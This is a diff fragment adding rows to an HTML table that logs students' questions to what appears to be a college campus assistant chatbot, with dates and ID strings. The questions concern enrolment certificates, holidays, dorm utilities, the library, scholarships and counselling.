+<tr><td>150</td><td class='tt'>你好，请问你能回答关于学校的哪些问题？</td><td class='tm'>2026-09-20</td><td class='tm'>uQWsRrqJKRi3QvRhn8feMQHE</td></tr>
+<tr><td>151</td><td class='tt'>舍友半夜不睡觉打游戏很吵怎么办 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-20</td><td class='tm'>kFPKst2yOYWQU5ZGOnxvsLGQ</td></tr>
+<tr><td>152</td><td class='tt'>中秋国庆连放13天嘛？</td><td class='tm'>2026-09-20</td><td class='tm'>wsah2EWjechemSNTaifeMAIt</td></tr>
+<tr><td>153</td><td class='tt'>放假了吗</td><td class='tm'>2026-09-20</td><td class='tm'>r6LbVGRAldOa8WaOCrsZxDCU</td></tr>
+<tr><td>154</td><td class='tt'>为什么打开不了学长学姐带你逛图书馆</td><td class='tm'>2026-09-20</td><td class='tm'>crEqykCAzptSzL3qxCwVffUP</td></tr>
+<tr><td>155</td><td class='tt'>电脑端一直登录不上。</td><td class='tm'>2026-09-20</td><td class='tm'>doxXGaWhPwa0RCePc5fqFVKP</td></tr>
+<tr><td>156</td><td class='tt'>武鸣校区怎么预约买药</td><td class='tm'>2026-09-20</td><td class='tm'>lPAd7yvu9pNOkOEcX3o4OcMX</td></tr>
+<tr><td>157</td><td class='tt'>武鸣校区怎么预约买药</td><td class='tm'>2026-09-20</td><td class='tm'>dnwnKFuJeziAfvqj2e3CX69P</td></tr>
+<tr><td>158</td><td class='tt'>怎么请假</td><td class='tm'>2026-09-20</td><td class='tm'>unL4d3s9VIjO4YDdIfkwv6Yp</td></tr>
+<tr><td>159</td><td class='tt'>贫困生认定</td><td class='tm'>2026-09-20</td><td class='tm'>c6fohraLdtMd3Z6O5NXlhLa4</td></tr>
+<tr><td>160</td><td class='tt'>怎么弄在校证明</td><td class='tm'>2026-09-20</td><td class='tm'>h3htObxQXHKAtndL2dYCkFqR</td></tr>
+<tr><td>161</td><td class='tt'>大一怎么申请校外住宿</td><td class='tm'>2026-09-20</td><td class='tm'>c6FjbERZxUKp0bi5QsmAhQCA</td></tr>
+<tr><td>162</td><td class='tt'>录取通知书</td><td class='tm'>2026-09-20</td><td class='tm'>dxzSsSpxCPLVXNls5rP9OAoy</td></tr>
+<tr><td>163</td><td class='tt'>我们中秋国庆的放假时间是啥时候到啥时候</td><td class='tm'>2026-09-20</td><td class='tm'>kVHqBScuuYx6CuxY8CHhGmhZ</td></tr>
+<tr><td>164</td><td class='tt'>宿舍电费</td><td class='tm'>2026-09-20</td><td class='tm'>hO8AzLX94rSP2etuDt4Fvqy3</td></tr>
+<tr><td>165</td><td class='tt'>谢谢有电子版的录取通知书吗</td><td class='tm'>2026-09-20</td><td class='tm'>xla5XPKWl7AWaUFc3BZWgJCe</td></tr>
+<tr><td>166</td><td class='tt'>怎么查录取通知书</td><td class='tm'>2026-09-20</td><td class='tm'>zOSYccIVo5Rlpc9WNYIF8RxI</td></tr>
+<tr><td>167</td><td class='tt'>在哪里申请？</td><td class='tm'>2026-09-20</td><td class='tm'>dEgumcDri7YkLowo8ddYxxAw</td></tr>
+<tr><td>168</td><td class='tt'>现在还能开在校证明吗</td><td class='tm'>2026-09-20</td><td class='tm'>vpSKcTk4iYJTJwf8nvWISRLr</td></tr>
+<tr><td>169</td><td class='tt'>宿舍插排交了电费但是没有电</td><td class='tm'>2026-09-20</td><td class='tm'>sBfnJPgM4bLfvacO8BKJAtPJ</td></tr>
+<tr><td>170</td><td class='tt'>中秋国庆连不连放</td><td class='tm'>2026-09-19</td><td class='tm'>g3NeeFskS49BhfLGVIvKXdCL</td></tr>
+<tr><td>171</td><td class='tt'>1+1</td><td class='tm'>2026-09-19</td><td class='tm'>rzwhVOi8TWf3oRqzCeXedvQY</td></tr>
+<tr><td>172</td><td class='tt'>怎么申请学校盖章</td><td class='tm'>2026-09-19</td><td class='tm'>vkTtUY7iKEI4a5c1dY4IMtF7</td></tr>
+<tr><td>173</td><td class='tt'>申请学校盖章在哪里</td><td class='tm'>2026-09-19</td><td class='tm'>dpjW3iTZTyItAwWKKujqJFt0</td></tr>
+<tr><td>174</td><td class='tt'>学校盖章怎么申请</td><td class='tm'>2026-09-19</td><td class='tm'>lWvFEDha7Cjcutx95xbjX6hr</td></tr>
+<tr><td>175</td><td class='tt'>入学回执在哪里盖章</td><td class='tm'>2026-09-19</td><td class='tm'>avUZxNNOpijfOYofcutdsGx3</td></tr>
+<tr><td>176</td><td class='tt'>怎么查自己借过的图书？</td><td class='tm'>2026-09-19</td><td class='tm'>l0SePQ83TkmA4chPOaICqWGW</td></tr>
+<tr><td>177</td><td class='tt'>宿舍的电费怎么充值</td><td class='tm'>2026-09-19</td><td class='tm'>tlneDRZ1HGOIOltHFUOEErxy</td></tr>
+<tr><td>178</td><td class='tt'>你能干什么</td><td class='tm'>2026-09-19</td><td class='tm'>ze6VGLv6jQ7DgJ5tRKVZEmva</td></tr>
+<tr><td>179</td><td class='tt'>学校组织普通话考试吗</td><td class='tm'>2026-09-19</td><td class='tm'>xhOWEEog3KoPiAISLlIsXars</td></tr>
+<tr><td>180</td><td class='tt'>请问A13栋楼在哪里</td><td class='tm'>2026-09-19</td><td class='tm'>aSJLAuiVOuQCNXl7dnbF3AFz</td></tr>
+<tr><td>181</td><td class='tt'>怎么续假</td><td class='tm'>2026-09-19</td><td class='tm'>u2tQgNv7xLirEhzarDXSI7A2</td></tr>
+<tr><td>182</td><td class='tt'>中秋国庆放多少天假</td><td class='tm'>2026-09-19</td><td class='tm'>bxWEuMkD6hpGaspuQYqq23Le</td></tr>
+<tr><td>183</td><td class='tt'>旷课</td><td class='tm'>2026-09-19</td><td class='tm'>qe14SnhBK37BX10QxgjAqLVE</td></tr>
+<tr><td>184</td><td class='tt'>旷课</td><td class='tm'>2026-09-19</td><td class='tm'>e5j6ZqJZiaeQtl9myW0IwiGP</td></tr>
+<tr><td>185</td><td class='tt'>如何进入图书馆</td><td class='tm'>2026-09-19</td><td class='tm'>nxjra5lUtxdA2QqbWbTpAy9j</td></tr>
+<tr><td>186</td><td class='tt'>去图书馆学习需要预约吗？</td><td class='tm'>2026-09-18</td><td class='tm'>stSKvNUOKBA9bg1m54q9DQ6L</td></tr>
+<tr><td>187</td><td class='tt'>只上课不参加任何活动和社团能在毕业前把学</td><td class='tm'>2026-09-18</td><td class='tm'>ouG8Yy2oG8EgGekkkW8VDRFx</td></tr>
+<tr><td>188</td><td class='tt'>学校这个学期还会组织普通话考证吗</td><td class='tm'>2026-09-18</td><td class='tm'>bb4MSfyaOGbOINwKer3HpFxg</td></tr>
+<tr><td>189</td><td class='tt'>在校证明怎么申请</td><td class='tm'>2026-09-18</td><td class='tm'>t6KfXJoGGhlhzU6quYLm1XE8</td></tr>
+<tr><td>190</td><td class='tt'>今日校园</td><td class='tm'>2026-09-18</td><td class='tm'>w9WUyDSOTeXRAXbgeujAXYoF</td></tr>
+<tr><td>191</td><td class='tt'>还有什么奖学金 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-18</td><td class='tm'>zN4dSSNC3YOFYLiRkbj36Mw6</td></tr>
+<tr><td>192</td><td class='tt'>本学期有普通话考试报名吗</td><td class='tm'>2026-09-18</td><td class='tm'>rkirnCBaTL8d01OZ4z2MhX6Q</td></tr>
+<tr><td>193</td><td class='tt'>这个学期有普通话考试报名吗</td><td class='tm'>2026-09-18</td><td class='tm'>cau3uW6DstzAxHK4o0xH5SRq</td></tr>
+<tr><td>194</td><td class='tt'>学校编码是什么</td><td class='tm'>2026-09-18</td><td class='tm'>imuSAfxXv8JxJG6j2d3OeMwr</td></tr>
+<tr><td>195</td><td class='tt'>她说不可以请假，到时候记我不参加社团怎么</td><td class='tm'>2026-09-18</td><td class='tm'>upIySOuvNkvRUPeoO1OgPivM</td></tr>
+<tr><td>196</td><td class='tt'>什么情况会被记处分</td><td class='tm'>2026-09-18</td><td class='tm'>ibJCzd5xLBDSLIAyufQL1KIR</td></tr>
+<tr><td>197</td><td class='tt'>我社团有活动我是干事我不去招新会被记处分</td><td class='tm'>2026-09-18</td><td class='tm'>vFVgmZHgsxy6YMSkopRzbWTB</td></tr>
+<tr><td>198</td><td class='tt'>怎么申请大学生活动中心的舞蹈房？</td><td class='tm'>2026-09-18</td><td class='tm'>whYOohP3u7nmE4rmFFvJhUH1</td></tr>
+<tr><td>199</td><td class='tt'>宿舍报修</td><td class='tm'>2026-09-18</td><td class='tm'>l9OoGwVgb4LAXnpfqBUqa4Fv</td></tr>
+<tr><td>200</td><td class='tt'>在校证明怎么开</td><td class='tm'>2026-09-18</td><td class='tm'>azV9PK9UNJ9AantiJSrUxcy7</td></tr>
+<tr><td>201</td><td class='tt'>心理室在哪 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-18</td><td class='tm'>o7jwjY5jHDgUV8rz01ZKN5Ve</td></tr>
+<tr><td>202</td><td class='tt'>我要预览在校证明</td><td class='tm'>2026-09-18</td><td class='tm'>rltQK2FlQuoqz4WdC8CZsJk7</td></tr>
+<tr><td>203</td><td class='tt'>好的</td><td class='tm'>2026-09-18</td><td class='tm'>ri9TCde8DDmTicI7llUXDo88</td></tr>
+<tr><td>204</td><td class='tt'>有教务处的电话吗？</td><td class='tm'>2026-09-17</td><td class='tm'>tFk5VeGzhutKdM4a8tIQu9U6</td></tr>
+<tr><td>205</td><td class='tt'>进图书馆</td><td class='tm'>2026-09-17</td><td class='tm'>weFNr6JR2pY6oEzeO37TKNAx</td></tr>
+<tr><td>206</td><td class='tt'>进图书馆需要什么吗 还是可以直接进去</td><td class='tm'>2026-09-17</td><td class='tm'>fdrMBKN2n9x7nMOUVwRWqUs5</td></tr>
+<tr><td>207</td><td class='tt'>我要开在校证明</td><td class='tm'>2026-09-17</td><td class='tm'>peI2FLrCyIW0pxs5kWmJUlNx</td></tr>
+<tr><td>208</td><td class='tt'>帮我查一下我是否有处分记录</td><td class='tm'>2026-09-17</td><td class='tm'>ytMYIf25T0N33TqWj8C7EPzK</td></tr>
+<tr><td>209</td><td class='tt'>25号中秋24号下午没课可以直接回去吗</td><td class='tm'>2026-09-17</td><td class='tm'>kQo2ZeFhLnapKtCBfXazgITP</td></tr>
+<tr><td>210</td><td class='tt'>怎么申请免修体育课</td><td class='tm'>2026-09-17</td><td class='tm'>wRdRJa9hT9LVP0NDGr16TRGc</td></tr>
+<tr><td>211</td><td class='tt'>学校校车</td><td class='tm'>2026-09-17</td><td class='tm'>zrxD68X9MTwOwWivewQc1l6i</td></tr>
+<tr><td>212</td><td class='tt'>想问一下，我们学校有水库移民可以申请的补</td><td class='tm'>2026-09-17</td><td class='tm'>gfRkDCryhKA99jsqcpvuXBfD</td></tr>
+<tr><td>213</td><td class='tt'>我心情不好怎么办</td><td class='tm'>2026-09-17</td><td class='tm'>u3szlNpVpdX5C2kQ20876X0m</td></tr>
+<tr><td>214</td><td class='tt'>在校证明申请通过后在哪里查看</td><td class='tm'>2026-09-17</td><td class='tm'>g49hUEgUa2j9PoFHAIznFVJA</td></tr>
+<tr><td>215</td><td class='tt'>学生证明申请成功后去哪找电子版的</td><td class='tm'>2026-09-17</td><td class='tm'>o1FKqx3LIz19EJfK0OKcgEAV</td></tr>
+<tr><td>216</td><td class='tt'>我想要下载链接</td><td class='tm'>2026-09-17</td><td class='tm'>h8rB8KvTGEoXAuiazjjXrHJV</td></tr>
+<tr><td>217</td><td class='tt'>我想打印在校证明但是我找不到在哪</td><td class='tm'>2026-09-17</td><td class='tm'>pY90yUmkdKQv8gClFV4Zd83U</td></tr>
+<tr><td>218</td><td class='tt'>健身房怎么申请</td><td class='tm'>2026-09-17</td><td class='tm'>tJQReTMBO8jTxbqPrytLoSA0</td></tr>
+<tr><td>219</td><td class='tt'>在校证明申请通过怎么打印出来</td><td class='tm'>2026-09-17</td><td class='tm'>ciCLKTLfY5Ew1MwEsv8SXzmm</td></tr>
+<tr><td>220</td><td class='tt'>为什么不能回答我</td><td class='tm'>2026-09-17</td><td class='tm'>z9qyru79samMRJpzcWtV0gie</td></tr>
+<tr><td>221</td><td class='tt'>在读证明怎么开</td><td class='tm'>2026-09-17</td><td class='tm'>cZzvCRRWm6gx9qf46Ahrjicv</td></tr>
+<tr><td>222</td><td class='tt'>在校证明和在读证明有啥区别</td><td class='tm'>2026-09-17</td><td class='tm'>geLiia19wRuD07DCIZnPMSF0</td></tr>
+<tr><td>223</td><td class='tt'>怎么申请入学回执 入学证明</td><td class='tm'>2026-09-17</td><td class='tm'>fqIgS0Mr1yklDtljm7AyJ6gv</td></tr>
+<tr><td>224</td><td class='tt'>在读证明可以买高铁学生票</td><td class='tm'>2026-09-17</td><td class='tm'>vbZcFG1THUztT5nVL3YIdSXJ</td></tr>
+<tr><td>225</td><td class='tt'>有在读证明可以买学生票吗</td><td class='tm'>2026-09-17</td><td class='tm'>eP2SdZHQ5FXURDm3gLVmohpH</td></tr>
+<tr><td>226</td><td class='tt'>公选课，补考不过，会被重修吗</td><td class='tm'>2026-09-17</td><td class='tm'>jhwIDLlgFmEceuy5g9p8e8fM</td></tr>
+<tr><td>227</td><td class='tt'>老师好，你可以帮我抢票吗</td><td class='tm'>2026-09-17</td><td class='tm'>svfMOtRy4DS1T49AMP1SPRmp</td></tr>
+<tr><td>228</td><td class='tt'>在哪里下载在读证明</td><td class='tm'>2026-09-17</td><td class='tm'>p4yWEbg9j4OOOX6SXHnEu07X</td></tr>
+<tr><td>229</td><td class='tt'>我想吃辣条</td><td class='tm'>2026-09-17</td><td class='tm'>cl9xnn9d7We9iIOAxyXHwzyu</td></tr>
+<tr><td>230</td><td class='tt'>我想拿奖学金 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-17</td><td class='tm'>qXg1AeTNi0QJKcCBEOULUZu9</td></tr>
+<tr><td>231</td><td class='tt'>我心情不好</td><td class='tm'>2026-09-17</td><td class='tm'>i9iFdMlLPyCjmMS18tdB5NoO</td></tr>
+<tr><td>232</td><td class='tt'>广西工商职业技术学院可以吗</td><td class='tm'>2026-09-16</td><td class='tm'>gH6WxXLAC6KRpBa7LvxK68KV</td></tr>
+<tr><td>233</td><td class='tt'>什么时候才出放假通知</td><td class='tm'>2026-09-16</td><td class='tm'>hzgbD5suxfpXv6LWCPOgmmiT</td></tr>
+<tr><td>234</td><td class='tt'>选修课补考不过的话，会怎么样</td><td class='tm'>2026-09-16</td><td class='tm'>hrIvbsocehlr1SfJyfvS5XPL</td></tr>
+<tr><td>235</td><td class='tt'>给我学校的地图</td><td class='tm'>2026-09-16</td><td class='tm'>atHV9XcK07rxxyEGktP6P7Jf</td></tr>
+<tr><td>236</td><td class='tt'>选修课补考不过的话，会怎么样，会被重修吗</td><td class='tm'>2026-09-16</td><td class='tm'>fOrw176NyLKNlwSwgu2dPGhh</td></tr>
+<tr><td>237</td><td class='tt'>什么</td><td class='tm'>2026-09-16</td><td class='tm'>qUzBiwvt7f4QT8pN3aDKmrq5</td></tr>
+<tr><td>238</td><td class='tt'>中秋和国庆连放吗？</td><td class='tm'>2026-09-16</td><td class='tm'>k3BHmCNP3qXx2sy86rakD7mm</td></tr>
+<tr><td>239</td><td class='tt'>已经申请了并同意了。怎么打印出来</td><td class='tm'>2026-09-16</td><td class='tm'>pYUwRdJaR10oaTwNyEzbjZQA</td></tr>
+<tr><td>240</td><td class='tt'>怎么下载，我只看到了辅导员同意界面</td><td class='tm'>2026-09-16</td><td class='tm'>lg6E6AdDdbR9r4A0TgDWA1TG</td></tr>
+<tr><td>241</td><td class='tt'>我要保修宿舍问题</td><td class='tm'>2026-09-16</td><td class='tm'>cfaQKjL6ZzKYEuzdDZ6SSBn2</td></tr>
+<tr><td>242</td><td class='tt'>我要保修宿舍问题</td><td class='tm'>2026-09-16</td><td class='tm'>uqJLyQCgvtLnia6K4NRE6q6e</td></tr>
+<tr><td>243</td><td class='tt'>商小图是什么意思</td><td class='tm'>2026-09-16</td><td class='tm'>a8pHd0lj7VdnY7Nwb2ucuxsA</td></tr>
+<tr><td>244</td><td class='tt'>心理测评 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-16</td><td class='tm'>hYGDogodcbeJJ8Sdbf5CTdnt</td></tr>
+<tr><td>245</td><td class='tt'>贫困认定有多少钱</td><td class='tm'>2026-09-16</td><td class='tm'>upeODNZyVEDSNp6Q9UPmo6Tx</td></tr>
+<tr><td>246</td><td class='tt'>2605无人机班的体育老师是谁</td><td class='tm'>2026-09-16</td><td class='tm'>s2HLwLrFdZ3Djp7sz3bFxroh</td></tr>
+<tr><td>247</td><td class='tt'>我换了新的手机号码，今日校园无法登录了， <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-16</td><td class='tm'>mCLiFMbAExv4yVj0LHH9WjcS</td></tr>
+<tr><td>248</td><td class='tt'>补考错过了怎么办</td><td class='tm'>2026-09-16</td><td class='tm'>oDCo6iA2jKcfibkD8wXRf5QT</td></tr>
+<tr><td>249</td><td class='tt'>武鸣区学校地图</td><td class='tm'>2026-09-16</td><td class='tm'>nMbr3DnGBLGrxCHy7u1NIMVz</td></tr>
+<tr><td>250</td><td class='tt'>健身房怎么申请使用</td><td class='tm'>2026-09-16</td><td class='tm'>i0AjV8UZSXgJni6nzE567tti</td></tr>
+<tr><td>251</td><td class='tt'>？</td><td class='tm'>2026-09-16</td><td class='tm'>r08qEs99nIvEXvsOkpMonXek</td></tr>
+<tr><td>252</td><td class='tt'>如何快速学会计算机网络技术</td><td class='tm'>2026-09-16</td><td class='tm'>qkwaR6fJzv6a94ctko9rN6AP</td></tr>
+<tr><td>253</td><td class='tt'>2026年放假通知</td><td class='tm'>2026-09-16</td><td class='tm'>iquc0xMBl3aarzr5rrYUwOeh</td></tr>
+<tr><td>254</td><td class='tt'>医务室在哪</td><td class='tm'>2026-09-16</td><td class='tm'>y42UsMRQxshu9x4VYZLuCTVR</td></tr>
+<tr><td>255</td><td class='tt'>如何打开学校官网登录网上办事大厅</td><td class='tm'>2026-09-15</td><td class='tm'>gehQqDG31K99CWzNp9vwyLow</td></tr>
+<tr><td>256</td><td class='tt'>怎么申请空教室</td><td class='tm'>2026-09-15</td><td class='tm'>a5QPOtLuz8ICdOy31I8ZRDXn</td></tr>
+<tr><td>257</td><td class='tt'>难受</td><td class='tm'>2026-09-15</td><td class='tm'>ofhn4zwhtLpxwoGnUX85zzye</td></tr>
+<tr><td>258</td><td class='tt'>怎么查学生在哪个班</td><td class='tm'>2026-09-15</td><td class='tm'>cyO30UXe5bNNbb5UOxlKYUw6</td></tr>
+<tr><td>259</td><td class='tt'>帮我出陆婷老师的资料</td><td class='tm'>2026-09-15</td><td class='tm'>wSgrNuJb0kxzXyObzc81AXSo</td></tr>
+<tr><td>260</td><td class='tt'>为什么宿舍充了电费电表显示有余额但是还是</td><td class='tm'>2026-09-15</td><td class='tm'>urF0cbI3vu5m4BG1hVYKvWb3</td></tr>
+<tr><td>261</td><td class='tt'>电表有剩余量但是用不了是为什么</td><td class='tm'>2026-09-15</td><td class='tm'>lCYU8mf6aRwrPy54EUq5h1E6</td></tr>
+<tr><td>262</td><td class='tt'>违规电器功率达到多少才算？</td><td class='tm'>2026-09-15</td><td class='tm'>zNq8fRUtvm8jNvl8NqYee0xO</td></tr>
+<tr><td>263</td><td class='tt'>在校证明怎么打印出来里面</td><td class='tm'>2026-09-15</td><td class='tm'>kpDM7ZuUOti4bwy5e7iA6ZZd</td></tr>
+<tr><td>264</td><td class='tt'>挂过科不能申请入党吗</td><td class='tm'>2026-09-15</td><td class='tm'>pCfhsaRcTOtqjby0BUhJVOoc</td></tr>
+<tr><td>265</td><td class='tt'>在哪申请健身房</td><td class='tm'>2026-09-15</td><td class='tm'>d2tqjMMcHHgZdu69WDFl5EBj</td></tr>
+<tr><td>266</td><td class='tt'>有什么好吃的</td><td class='tm'>2026-09-15</td><td class='tm'>oAQfzL3oPFcEFNeMf4XqwIrQ</td></tr>
+<tr><td>267</td><td class='tt'>武鸣的医务室在哪</td><td class='tm'>2026-09-15</td><td class='tm'>hppLjToImEEh5yBoMDZxBVnV</td></tr>
+<tr><td>268</td><td class='tt'>我们学校的入党是怎么样的</td><td class='tm'>2026-09-15</td><td class='tm'>k6dmppRhjkS8x3cWKBp2EzwB</td></tr>
+<tr><td>269</td><td class='tt'>校园跑要怎么搞</td><td class='tm'>2026-09-15</td><td class='tm'>pKkia4ZkXKUgtyG5SDAlwWZe</td></tr>
+<tr><td>270</td><td class='tt'>人工智能素养这本书有吗</td><td class='tm'>2026-09-14</td><td class='tm'>adTyrwYKfWojrLTT3eRbmQWi</td></tr>
+<tr><td>271</td><td class='tt'>人工智能素养呢？</td><td class='tm'>2026-09-14</td><td class='tm'>kKfgqKa9D1kDBoJIGARq4Gcc</td></tr>
+<tr><td>272</td><td class='tt'>打印在校证明干嘛</td><td class='tm'>2026-09-14</td><td class='tm'>u3gCFlme9TfEMMqnNjADnZYd</td></tr>
+<tr><td>273</td><td class='tt'>借书时间有多久才有借阅记录</td><td class='tm'>2026-09-14</td><td class='tm'>saQOmLzb6sHrpJyX2Xpp2Hy3</td></tr>
+<tr><td>274</td><td class='tt'>学费</td><td class='tm'>2026-09-14</td><td class='tm'>sCgGaM7oM3gmVMTMHraJAjWR</td></tr>
+<tr><td>275</td><td class='tt'>中秋国庆连放吗</td><td class='tm'>2026-09-14</td><td class='tm'>bd1sXtGPMNmx33TtPVoO2v48</td></tr>
+<tr><td>276</td><td class='tt'>学校联系电话是多少</td><td class='tm'>2026-09-14</td><td class='tm'>zrizso1e72nLJNcfUqUPpxzM</td></tr>
+<tr><td>277</td><td class='tt'>学校有没有布洛芬卖呀</td><td class='tm'>2026-09-14</td><td class='tm'>r1wYwE2lRPxoCcWW6OE2JeLA</td></tr>
+<tr><td>278</td><td class='tt'>如何申请室内羽毛球</td><td class='tm'>2026-09-14</td><td class='tm'>tP7q1o6A2OccfHMa8Bejd3gX</td></tr>
+<tr><td>279</td><td class='tt'>我们学校的校车时间表</td><td class='tm'>2026-09-14</td><td class='tm'>m516TaQUKpVPrjPRY0z36037</td></tr>
+<tr><td>280</td><td class='tt'>心理咨询室在哪 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-14</td><td class='tm'>xqwBuisvfn74ZhSRXUKZwRl7</td></tr>
+<tr><td>281</td><td class='tt'>怎么预约心理咨询 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-14</td><td class='tm'>p26AxOriZi6kOr7k4K2ov4Q1</td></tr>
+<tr><td>282</td><td class='tt'>心理咨询室在哪里 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-14</td><td class='tm'>i6udVMRBxOos8vZ9jATwIzVF</td></tr>
+<tr><td>283</td><td class='tt'>在哪里可以看到校园跑</td><td class='tm'>2026-09-13</td><td class='tm'>tUNBHhNmfyGTcR9YBGSuTNT6</td></tr>
+<tr><td>284</td><td class='tt'>请问假条科长还没批怎么销假</td><td class='tm'>2026-09-13</td><td class='tm'>hrqPZwaXXYkNn3KUxy49wNZ7</td></tr>
+<tr><td>285</td><td class='tt'>怎么销假</td><td class='tm'>2026-09-13</td><td class='tm'>yEMsXfASSlwTtfr8MKYBMtEa</td></tr>
+<tr><td>286</td><td class='tt'>在哪里查看校园跑</td><td class='tm'>2026-09-13</td><td class='tm'>gI1eXnAmItMUG0WTI3E0SWVJ</td></tr>
+<tr><td>287</td><td class='tt'>怎么撤销报修</td><td class='tm'>2026-09-13</td><td class='tm'>br4lPmqFksDpxod0gburhDEp</td></tr>
+<tr><td>288</td><td class='tt'>就是在库内的资助名单上要填写什么材料吗</td><td class='tm'>2026-09-13</td><td class='tm'>oYtmlzSHsBakDGd14VvR2FSy</td></tr>
+<tr><td>289</td><td class='tt'>在校证明打印的申请申述怎么写</td><td class='tm'>2026-09-13</td><td class='tm'>eov5nb3f8CWrIycu5sYkvrYd</td></tr>
+<tr><td>290</td><td class='tt'>如何下载PDF版本的盖章证明</td><td class='tm'>2026-09-13</td><td class='tm'>wmtSy1T0t7T2zqw5eS8RQzTy</td></tr>
+<tr><td>291</td><td class='tt'>校车时间表</td><td class='tm'>2026-09-13</td><td class='tm'>bNMd4iSrNboi8t1zT2PYuGNv</td></tr>
+<tr><td>292</td><td class='tt'>学校里的健身房是免费的吗？</td><td class='tm'>2026-09-13</td><td class='tm'>lzcG7xPvJK8NjG74UDEKjD00</td></tr>
+<tr><td>293</td><td class='tt'>AI聚合查询
+
+学校里的健身房是阔以免费</td><td class='tm'>2026-09-13</td><td class='tm'>lQABAa35fNiO4nIiqMkb9PrU</td></tr>
+<tr><td>294</td><td class='tt'>学校里的健身房是阔以免费用，还是要收钱</td><td class='tm'>2026-09-13</td><td class='tm'>ciTi3cxF1DK1sE3V05MBCX90</td></tr>
+<tr><td>295</td><td class='tt'>？</td><td class='tm'>2026-09-13</td><td class='tm'>sVUbwsGuLuYPajIwLj2t252m</td></tr>
+<tr><td>296</td><td class='tt'>？</td><td class='tm'>2026-09-13</td><td class='tm'>k80Q1EnXRwpFQeDvPUC3tHRr</td></tr>
+<tr><td>297</td><td class='tt'>下载PDF版本盖章证明是在校园内的自助打</td><td class='tm'>2026-09-13</td><td class='tm'>blldfwxzuHlJKnRFB7JKZyoh</td></tr>
+<tr><td>298</td><td class='tt'>在校证明打印通过审核后如何下载电子版PD</td><td class='tm'>2026-09-13</td><td class='tm'>ckYKVBobEN2GpqBLgK9nBZNb</td></tr>
+<tr><td>299</td><td class='tt'>学生证明每个人都要弄吗？</td><td class='tm'>2026-09-13</td><td class='tm'>jO221ShBjm5cDo5h3x0BE5Ki</td></tr>
+<tr><td>300</td><td class='tt'>在校证明每个人都要弄吗？</td><td class='tm'>2026-09-13</td><td class='tm'>xfuHlqlPo5ZHYLxfqsxHi6is</td></tr>
+<tr><td>301</td><td class='tt'>现在是凌晨四点半，我睡不着</td><td class='tm'>2026-09-12</td><td class='tm'>rVA0iUZAXMSZegYhos85ftvn</td></tr>
+<tr><td>302</td><td class='tt'>在校证明打印的电子版如何下载</td><td class='tm'>2026-09-12</td><td class='tm'>os1yJPb7r0wyjxMGkgpSWckV</td></tr>
+<tr><td>303</td><td class='tt'>报修可以撤销吗</td><td class='tm'>2026-09-12</td><td class='tm'>subIvsZiHWVREwbVKcFfHf48</td></tr>
+<tr><td>304</td><td class='tt'>我在校园维修报修了，报修可以撤销吗</td><td class='tm'>2026-09-12</td><td class='tm'>miVP7DUxIYtKX5pjikrRWEJn</td></tr>
+<tr><td>305</td><td class='tt'>学生证明打印通过了然后去哪里打印</td><td class='tm'>2026-09-12</td><td class='tm'>qsKu28v0CDk8x6zhusY577vI</td></tr>
+<tr><td>306</td><td class='tt'>图书馆的电脑室周末开门吗</td><td class='tm'>2026-09-12</td><td class='tm'>pCe8taIjr6Ns0D7Cu1mhOJWj</td></tr>
+<tr><td>307</td><td class='tt'>开不开</td><td class='tm'>2026-09-12</td><td class='tm'>v9jXLVn9AXr6fRNuWLQoDYNv</td></tr>
+<tr><td>308</td><td class='tt'>升本率</td><td class='tm'>2026-09-12</td><td class='tm'>uRxoSGug9KZvhl9YcP9XerQ9</td></tr>
+<tr><td>309</td><td class='tt'>怎么没看到有请假？</td><td class='tm'>2026-09-12</td><td class='tm'>xq8MPxwNkAVxtON5z62FKJxQ</td></tr>
+<tr><td>310</td><td class='tt'>实训室安全准入忘记考试了怎么办</td><td class='tm'>2026-09-11</td><td class='tm'>digYZVuLy5RFBmpWdg90wpjh</td></tr>
+<tr><td>311</td><td class='tt'>作为一名新生，实训室安全准入忘记考试了怎</td><td class='tm'>2026-09-11</td><td class='tm'>cJXqbmdHOJuKyD5UiApr9xS6</td></tr>
+<tr><td>312</td><td class='tt'>2026年中秋放假什么时候</td><td class='tm'>2026-09-11</td><td class='tm'>eSlaUVKeVfujqmrqZH2rjRnm</td></tr>
+<tr><td>313</td><td class='tt'>通过申请之后没有PDF可以下载</td><td class='tm'>2026-09-11</td><td class='tm'>yMb2KtTdDbjRo9eXXwxjGdOX</td></tr>
+<tr><td>314</td><td class='tt'>在哪里下载</td><td class='tm'>2026-09-11</td><td class='tm'>bUbrR7RGfbmfL6B78vsUZW4T</td></tr>
+<tr><td>315</td><td class='tt'>？</td><td class='tm'>2026-09-11</td><td class='tm'>vrom7R1mEYYFk6LDZhzR1l3g</td></tr>
+<tr><td>316</td><td class='tt'>怎么进不去</td><td class='tm'>2026-09-11</td><td class='tm'>yczH22CqDwW4DL1XHchNu4Qm</td></tr>
+<tr><td>317</td><td class='tt'>学生在校证明打印材料怎么查看</td><td class='tm'>2026-09-11</td><td class='tm'>qTvHEBirigiZwjs0cqCndbv4</td></tr>
+<tr><td>318</td><td class='tt'>心理问题 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-11</td><td class='tm'>vqch21nyJ135rhYfSTnpal5N</td></tr>
+<tr><td>319</td><td class='tt'>怎么填国家奖学金申请表 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-11</td><td class='tm'>rZ4WADcYBwHM4SSJMOx9dcGu</td></tr>
+<tr><td>320</td><td class='tt'>请问如何办理校园网</td><td class='tm'>2026-09-11</td><td class='tm'>e61djElgeaPPnJeguC6SnuoO</td></tr>
+<tr><td>321</td><td class='tt'>学校的校车可以去那里</td><td class='tm'>2026-09-11</td><td class='tm'>iiDvTvRjxr5ZW2xROLsTYiU3</td></tr>
+<tr><td>322</td><td class='tt'>自考是什么时候</td><td class='tm'>2026-09-11</td><td class='tm'>m0tennMxzchUA17lchdEWSBM</td></tr>
+<tr><td>323</td><td class='tt'>中秋国庆连放吗</td><td class='tm'>2026-09-11</td><td class='tm'>dCTqpmikbQmGDPMaS8Hb86mm</td></tr>
